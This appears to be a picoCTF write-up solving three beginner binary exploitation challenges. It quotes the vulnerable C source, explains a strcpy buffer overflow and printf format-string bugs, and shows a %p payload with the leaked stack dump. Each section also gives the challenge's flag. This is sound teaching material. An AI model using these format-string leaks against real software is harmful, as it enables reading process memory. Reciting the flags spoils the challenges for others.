# Buffer Overflow 0

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`

The Challenge name indicates is a basic buffer overflow, 

- As given in the program 

```

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

- We know that strcpy is a vulnerable function which will segmentfault and call the sigsev function,  
- This in turn will give us the flag. 

What you learned through solving this challenge:

1. Basics of Binary exploitation
2. Buffer flowing and how the program flows 

References:
- https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
---

# Format String0 

**Flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}`

- Format Specifiers in c are used describe the type of data we are printing. 

```
char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

```

- from this we know that the length of printf needs to be bigger than 2 * BUFFSIZE(32)
- the option `Gr%114d_Cheese` prints about 114 chars on thus proceeding us in the program 

- going futher:
```
char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}

```

- in the option `Cla%sic_Che%s%steak` the 5s expects a string argument which is not given because of which program crashes and gives us our flag.

What you learned through solving this challenge:

1. C format specifiers
2. How they can be use to segfault a program 


References

- https://www.geeksforgeeks.org/format-specifiers-in-c/

---


# flag leak

**Flag:** `picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}`

There is a format string vulnerablity in the source,

due to this vulnerablity we can read arbitary values in the stack, 

- using a bunch of %x. on the input gives us the output as, 

```
Tell me a story and then I'll tell you one >> %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p



Here's a story - 0xff9df6c00xff9df6e00x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x395f6b630x303666350x7d3731360xfbad20000xc1631000(nil)0xee7239900x804c0000x8049410(nil)0x804c0000xff9df7a80x80494180x20xff9df8540xff9df860(nil)0xff9df7c0(nil)(nil)0xee519ed5

```

- converting this hex string to ascii we get some gibberish then in b/w `ocip{FTCk43L_gn1g4lFff0_4tS_9_kc06f5}716û­` so now only have to rearrange and we have the flag, 
- since stack foes from bottom to up rearranging every 4 bytes we get, 

- `picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}`

What you learned through solving this challenge:

1. format string vulnerablities
2. C stack handling (need to learn about this more)

Other incorrect methods you tried:

- Was having problems with converting the given string in python, forgetting cyberchef is convinient tool and automatically delimits the string. 

References
- https://gchq.github.io/CyberChef
- https://owasp.org/www-community/attacks/Format_string_attack


